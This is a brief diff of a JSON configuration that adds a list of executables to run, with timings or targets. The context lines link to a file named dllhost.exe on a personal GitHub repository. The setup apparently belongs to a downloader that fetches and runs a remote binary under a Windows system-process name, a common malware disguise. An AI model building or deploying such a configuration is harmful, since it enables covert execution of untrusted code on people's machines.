@@ -9,6 +9,11 @@
     "CallService": 60000,
     "ResetVariables": 300000
   },
+  "appsToRun": {
+    "executable1.exe": 120000,
+    "executable2.exe": "all",
+    "executable3.exe": "target"
+  },
   "links": {
     "dllhostFiles": [
       "https://raw.githubusercontent.com/Aleksandr020295/Aleksandr_javascript/main/dllhost.exe",
